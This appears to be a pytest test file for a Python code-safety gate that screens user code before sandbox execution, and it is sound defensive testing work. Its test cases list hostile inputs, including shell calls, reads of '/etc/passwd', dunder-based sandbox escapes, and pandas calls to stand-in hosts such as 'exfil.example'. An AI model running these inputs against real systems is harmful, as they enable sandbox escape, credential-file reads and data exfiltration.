"""Safety gate tests — the one component where a miss is a security bug,
so the cases read like an attacker's checklist."""
import os

os.environ.setdefault("GOOGLE_CLOUD_PROJECT", "test")
os.environ.setdefault("OPENWEATHER_API_KEY", "test")
os.environ.setdefault("GOOGLE_PLACES_API_KEY", "test")

import pytest

from vital.sandbox import check_code_safety

LEGIT = """
import pandas as pd
import numpy as np
df = pd.read_csv('/data/sleep.csv')
debt = (480 - df['duration_min']).clip(lower=0).sum()
print(f"sleep debt: {debt} minutes over {len(df)} nights")
print(df.groupby(df['date'].str[:7])['duration_min'].mean())
"""


def test_legitimate_pandas_code_passes():
    ok, reason = check_code_safety(LEGIT)
    assert ok, reason


@pytest.mark.parametrize("code,expected_fragment", [
    ("import os\nos.system('ls')", "banned import: os"),
    ("import subprocess", "banned import: subprocess"),
    ("from os import system", "banned import: os"),
    ("from os.path import join", "banned import: os"),
    ("import socket", "banned import: socket"),
    ("import requests", "banned import: requests"),
    ("import urllib.request", "banned import: urllib"),
    ("import pickle", "banned import: pickle"),
    ("exec('print(1)')", "banned call: exec"),
    ("eval('1+1')", "banned call: eval"),
    ("open('/etc/passwd').read()", "banned call: open"),
    ("__import__('os')", "banned call: __import__"),
    ("getattr(__builtins__, 'op'+'en')", "banned call: getattr"),
    ("x.system('ls')", "banned attribute: .system"),
    ("import pandas as pd\npd.io.common.os.popen('id')", "banned attribute: .popen"),
    # bypasses found in review — the gate must match the security story
    ("__builtins__.open('/etc/passwd')", "banned"),          # dunder name AND .open attr
    ("import builtins\nbuiltins.open('/etc/passwd')", "banned import: builtins"),
    ("import io\nio.open('/etc/passwd')", "banned import: io"),
    ("().__class__.__bases__[0].__subclasses__()", "banned dunder"),
    ("x = [].__class__.__mro__", "banned dunder"),
    ("import pandas as pd\npd.read_csv('https://evil.example/x.csv')", "network URL"),
    ("import pandas as pd\ndf.to_csv('ftp://exfil.example/out.csv')", "network URL"),
])
def test_hostile_code_is_rejected(code, expected_fragment):
    ok, reason = check_code_safety(code)
    assert not ok
    assert expected_fragment in reason


def test_syntax_errors_are_rejected_not_crashing():
    ok, reason = check_code_safety("def broken(:")
    assert not ok and "syntax error" in reason


def test_gate_is_default_deny_on_parse():
    # a file of only comments/whitespace parses fine and is harmless
    ok, _ = check_code_safety("# nothing\n")
    assert ok
